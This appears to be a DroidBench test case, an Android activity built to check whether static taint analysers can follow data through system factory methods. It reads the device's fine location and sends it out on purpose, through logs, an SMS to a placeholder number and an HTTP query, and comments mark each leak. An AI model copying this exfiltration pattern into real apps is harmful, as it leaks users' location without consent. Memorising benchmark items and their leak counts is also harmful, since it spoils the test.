package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.StrictMode;
import android.telephony.SmsManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * @testcase_name FactoryMethods1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description This example obtains a LocationManager from a factory method contained
 * 	in the Android operating system, reads out the location, and leaks it.
 * @dataflow onCreate: source -> data -> sink 
 * @number_of_leaks 2
 * @challenges The analysis must be able to handle factory methods contained in
 * 	the operating system.
 */
public class FactoryMethods1 extends Activity implements LocationListener {

	Location data;
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_multi_handlers1);

		if (android.os.Build.VERSION.SDK_INT > 9) {
			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
			StrictMode.setThreadPolicy(policy);
		}
		
		Criteria crit = new Criteria();
		crit.setAccuracy(Criteria.ACCURACY_FINE);
        LocationManager locationManager = (LocationManager) 
        		getSystemService(Context.LOCATION_SERVICE);


        data = locationManager.getLastKnownLocation(locationManager.getBestProvider(crit, true));
		//data = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);

		if (data != null) {
			Log.d("Latitude", "Latitude: " + data.getLatitude()); //sink, leak
			Log.d("Longtitude", "Longtitude: " + data.getLongitude()); //sink, leak
			SmsManager sms = SmsManager.getDefault();
			sms.sendTextMessage("+49 1234", null, "Latitude: " + data.getLatitude(), null, null); // sink, leak

			try {
				connect("Latitude: " + data.getLatitude());
			} catch (Exception e) {
				e.printStackTrace();
			}

		}
	}

	@Override
	public void onLocationChanged(Location location) {
		if (location != null) {
			data = location;
			Log.v("Location Changed", location.getLatitude() + " and " + location.getLongitude());
		}
	}

	public void onProviderEnabled(String provider) {
	}

	public void onStatusChanged(String provider, int status,
								Bundle extras) {

	}

	// プロバイダが無効になったら呼び出される。
	public void onProviderDisabled(String provider) {
	}


	private void connect(String data) throws IOException {
		String URL = "http://www.google.de/search?q=";
		URL = URL.concat(data);
		java.net.URL url = new URL(URL);
		HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
		conn.setRequestMethod("GET");
		conn.setDoInput(true);
		// Starts the query
		conn.connect();

		InputStream is = conn.getInputStream();
		if (is == null)
			return;
		StringBuilder sb = new StringBuilder();
		BufferedReader br = new BufferedReader(new InputStreamReader(is));
		String line = null;
		try {
			while ((line = br.readLine()) != null)
				sb.append(line);
		} finally {
			br.close();
			is.close();
		}
		Log.d(getClass().getSimpleName(), sb.toString());
	}
	
}
